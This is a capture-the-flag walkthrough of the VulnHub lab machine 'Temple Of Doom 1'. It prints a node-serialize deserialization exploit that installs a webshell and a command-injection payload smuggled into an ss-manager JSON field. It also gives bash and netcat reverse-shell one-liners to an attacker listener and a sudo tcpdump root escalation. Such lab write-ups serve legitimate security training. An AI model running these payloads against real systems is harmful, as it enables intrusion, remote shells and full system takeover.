---
title: VulnHub - Temple Of Doom 1
author: ret2x
date: 2021-12-14 14:21:33 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, rce] 
image:
    path: /assets/images/templeofdoom/front.png
---

**Description:** A linux machine hosting a vulnerable web application on an arbitrary port wich is vulnerable to Insecure Deserealization triggering a Remote Code Execution. Software outdated and misconfigurations allowed to get root privileges.

**Author:** 0katz

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/temple-of-doom-1,243/](https://www.vulnhub.com/entry/temple-of-doom-1,243/)

## Information Gathering
### Host Discovery

A ping scan on the local network reveals the target machine, the script can be downloaded [here](https://github.com/ret2x-tools/ping-scan.git).

```console
root@kali:~$ ping-scan.py -r 192.168.179.0/24
192.168.179.177 is up
```

### Port Scanning

Full TCP port scan with nmap detected two open ports.

```console
root@kali:~$ nmap -n -v -p1-65535 -T4 192.168.179.177 -oG nmap/all-tcp-ports.txt
...
PORT    STATE SERVICE
22/tcp  open  ssh
666/tcp open  doom
```

### Service Enumeration

Version detection and script scanning was performed with nmap to discover more information about open ports.

```console
root@kali:~$ nmap -v -n -sC -sV -p22,666 192.168.179.177 -oN nmap/service-enum.txt
...
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 95:68:04:c7:42:03:04:cd:00:4e:36:7e:cd:4f:66:ea (RSA)
|   256 c3:06:5f:7f:17:b6:cb:bc:79:6b:46:46:cc:11:3a:7d (ECDSA)
|_  256 63:0c:28:88:25:d5:48:19:82:bb:bd:72:c6:6c:68:50 (ED25519)
666/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
...
```

### Enumeration on port 666

Browsing the web page an error message was detected.

![](/assets/images/templeofdoom/screenshot-1.png)

![](/assets/images/templeofdoom/screenshot-2.png)

Researching a little bit about the error was possible to detect a remote code execution vulnerability for this version of node js.

```console
root@kali:~$ searchsploit node serialize
--------------------------------------------------------------- --------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- --------------------------------
Node.JS - 'node-serialize' Remote Code Execution               | linux/remote/45265.js
Node.JS - 'node-serialize' Remote Code Execution (2)           | nodejs/webapps/49552.py
Node.JS - 'node-serialize' Remote Code Execution (3)           | nodejs/webapps/50036.js
--------------------------------------------------------------- --------------------------------
```

## Exploitation
### Insecure Deserealization

This occurs when untrusted input is passed into unserialize() function in node-serialize module can be exploited to achieve arbitrary code execution by passing a serialized JavaScript Object with an Immediately invoked function expression (IIFE), more information on this topic you can find it [here](https://medium.com/@chaudharyaditya/insecure-deserialization-3035c6b5766e).

We copy this exploit to our current directory.

```console
root@kali:~$ searchsploit -m nodejs/webapps/50036.js
```

If we analyze the exploit code, we need to inject our payload into the cookie value to trigger the execution of commands.

```console
root@kali:~$ cat 50036.js 
# Exploit Title: Node.JS - 'node-serialize' Remote Code Execution (3)
# Date: 17.06.2021
# Exploit Author: Beren Kuday GORUN
# Vendor Homepage: https://github.com/luin/serialize
# Software Link: https://github.com/luin/serialize
# Version: 0.0.4
# Tested on: Windows & Ubuntu
# CVE : 2017-5941

var serialize = require('node-serialize');
var payload = {
    "webShell" : "_$$ND_FUNC$$_function(){const http = require('http'); const url = require('url'); const ps  = require('child_process'); http.createServer(function (req, res) { var queryObject = url.parse(req.url,true).query; var cmd = queryObject['cmd']; try { ps.exec(cmd, function(error, stdout, stderr) { res.end(stdout); }); } catch (error) { return; }}).listen(443); }()"
    }
serialize.unserialize(serialize.serialize(payload))

/*
# after being exploited

┌──(root@kali)-[/home/kali]
└─# curl http://10.0.2.4:443?cmd=whoami
nodeadmin
```

We can replicate the exploitation process manually, first we intercept the request with burp, right click and **Send to Repeater**.

![](/assets/images/templeofdoom/screenshot-3.png)

In the repeater tab we click **Send** to have a baseline of the response length, then we copy the cookie value for take it to the burp **Decoder**.

![](/assets/images/templeofdoom/screenshot-4.png)

The cookie set by the server is a base64 encoded JSON object, we need to decode it to URL first and then to base64.

![](/assets/images/templeofdoom/screenshot-5.png)

We copy the payload from the script and base64 encode it.

![](/assets/images/templeofdoom/screenshot-6.png)

In the **Repeater** tab, we paste the resulting string in base64 as the cookie value, then click **Send**, this webshell listens on port 443 waiting for incoming commands via cmd parameter.

![](/assets/images/templeofdoom/screenshot-7.png)

Using curl we can run commands through the cmd parameter.

```console
root@kali:~$ curl http://192.168.179.177:443?cmd=id 
uid=1001(nodeadmin) gid=1001(nodeadmin) groups=1001(nodeadmin)
```

Then to get a reverse shell we need to set up a netcat listener in this case on port 443 and then execute the following curl request.

```console
root@kali:~$ curl http://192.168.179.177:443?cmd=$(urlencode 'bash -c "bash -i >& /dev/tcp/192.168.179.1/443 0>&1"')
```

We have a reverse shell with nodeadmin user privileges.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.177] 38956
bash: cannot set terminal process group (820): Inappropriate ioctl for device
bash: no job control in this shell
[nodeadmin@localhost ~]$ python -c "import pty;pty.spawn('/bin/bash')"
python -c "import pty;pty.spawn('/bin/bash')"
[nodeadmin@localhost ~]$
```

By listing the procesess **ss-manager** is running as user fireman, googling I found that it is a controller for multi-user management and traffic statistics, also this version is vulnerable to command execution, the exploit can be downloaded [here](https://www.exploit-db.com/exploits/43006).

```console
[nodeadmin@localhost ~]$ ps aux | grep fireman
ps aux | grep fireman
root       812  0.0  0.8 301464  4420 ?        S    23:41   0:00 su fireman -c /usr/local/bin/ss-manager
fireman    829  0.0  0.7  37060  3876 ?        Ss   23:41   0:00 /usr/local/bin/ss-manager
nodeadm+  1042  0.0  0.2 213788  1044 ?        S    23:45   0:00 grep --color=auto fireman
```

## Privilege Escalation
### Command Execution in ss-manager

According to the specifications of the exploit, this must be run under the UDP port 8833, by listing the servicess we can verify that it is running on the specified port.

```console
[nodeadmin@localhost ~]$ ss -ntlu
ss -ntlu
Netid  State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port  
...
udp    UNCONN   0        0               127.0.0.1:8839           0.0.0.0:*     
...
```

On the attacking machine we start a netcat listener on port 1337, then on the victim machine we connect to UDP port 8839 and we run the following command to get a shell from the target machine.

```console
[nodeadmin@localhost ~]$ nc -v -u 127.0.0.1 8839
nc -v -u 127.0.0.1 8839
Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Connected to 127.0.0.1:8839.
add: {"server_port":8003, "password":"test", "method":"||bash -c 'bash -i >& /dev/tcp/192.168.179.1/1337 0>&1'||"}
```

Now, we have a shell as user fireman.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.1] 52707
bash: cannot set terminal process group (848): Inappropriate ioctl for device
bash: no job control in this shell
[fireman@localhost root]$ id
id
uid=1002(fireman) gid=1002(fireman) groups=1002(fireman)
[fireman@localhost root]$
```

This user has enabled run some binaries with sudo permissions, we will abuse tcpdump to escalate to root.

```console
[fireman@localhost root]$ sudo -l
sudo -l
Matching Defaults entries for fireman on localhost:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fireman may run the following commands on localhost:
    (ALL) NOPASSWD: /sbin/iptables
    (ALL) NOPASSWD: /usr/bin/nmcli
    (ALL) NOPASSWD: /usr/sbin/tcpdump
[fireman@localhost root]$
```

### Sudo Permissions

An awesome guide how to exploit this you can find it [here](https://gtfobins.github.io/gtfobins/tcpdump/#sudo).

First we write a reverse shell into a file and give it execution permissions.

```console
[fireman@localhost root]$ echo 'nc 192.168.179.1 8081 -e /bin/bash' > /tmp/r00t
<ho 'nc 192.168.179.1 8081 -e /bin/bash' > /tmp/r00t
[fireman@localhost root]$ chmod +x /tmp/r00t
chmod +x /tmp/r00t
```

Then, we set up a netcat listener and run the following command to get a reverse shell as user root.

```console
[fireman@localhost root]$ sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/r00t -Z root
<-i eth0 -w /dev/null -W 1 -G 1 -z /tmp/r00t -Z root
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
0 packets dropped by kernel
[fireman@localhost root]$
```

As we can see now we are root and we can read the root flag.

```console
root@kali:~$ nc -vlnp 8081  
listening on [any] 8081 ...         
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.1] 33895
script -qc /bin/bash /dev/null                        
[root@localhost ~]#
```

```console
[root@localhost ~]# ls
ls
flag.txt
[root@localhost ~]# cat flag.txt
cat flag.txt
[+] You're a soldier.
[+] One of the best that the world could set against
[+] the demonic invasion.

+-----------------------------------------------------------------------------+
| |       |\                                           -~ /     \  /          |
|~~__     | \                                         | \/       /\          /|
|    --   |  \                                        | / \    /    \     /   |
|      |~_|   \                                   \___|/    \/         /      |
|--__  |   -- |\________________________________/~~\~~|    /  \     /     \   |
|   |~~--__  |~_|____|____|____|____|____|____|/ /  \/|\ /      \/          \/|
|   |      |~--_|__|____|____|____|____|____|_/ /|    |/ \    /   \       /   |
|___|______|__|_||____|____|____|____|____|__[]/_|----|    \/       \  /      |
|  \mmmm :   | _|___|____|____|____|____|____|___|  /\|   /  \      /  \      |
|      B :_--~~ |_|____|____|____|____|____|____|  |  |\/      \ /        \   |
|  __--P :  |  /                                /  /  | \     /  \          /\|
|~~  |   :  | /                                 ~~~   |  \  /      \      /   |
|    |      |/                        .-.             |  /\          \  /     |
|    |      /                        |   |            |/   \          /\      |
|    |     /                        |     |            -_   \       /    \    |
+-----------------------------------------------------------------------------+
|          |  /|  |   |  2  3  4  | /~~~~~\ |       /|    |_| ....  ......... |
|          |  ~|~ | % |           | | ~J~ | |       ~|~ % |_| ....  ......... |
|   AMMO   |  HEALTH  |  5  6  7  |  \===/  |    ARMOR    |#| ....  ......... |
+-----------------------------------------------------------------------------+

                FLAG: kre0cu4jl4rzjicpo1i7z5l1

[+] Congratulations on completing this VM & I hope you enjoyed my first boot2root.

[+] You can follow me on twitter: @0katz

[+] Thanks to the homie: @Pink_P4nther
[root@localhost ~]#
```
